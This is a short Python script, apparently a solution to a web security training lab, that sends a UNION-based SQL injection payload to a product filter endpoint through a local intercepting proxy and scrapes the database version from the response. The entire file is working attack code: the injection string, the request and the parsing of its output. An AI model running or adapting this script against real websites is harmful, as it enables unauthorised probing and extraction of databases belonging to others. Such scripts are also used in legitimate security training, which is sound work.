import requests
import urllib3
import sys
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def exploit_sqli_version(url):
    path = "/filter?category=Tech+gifts"
    sql_payload = "'+union+select+null,+version()--+-"
    req = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = req.text
    if "<td>8.0.42-0ubuntu0.20.04.1</td>" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res,'html.parser')
        version = soup.find(string=re.compile('.*0ubuntu0.*'))
        print('[+] The MySQL and Microsoft database version is: ' + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of MySQL and Microsoft.")

    if not exploit_sqli_version(url):
        print("[-] Unable to obtain the version of MySQL and Microsoft.")
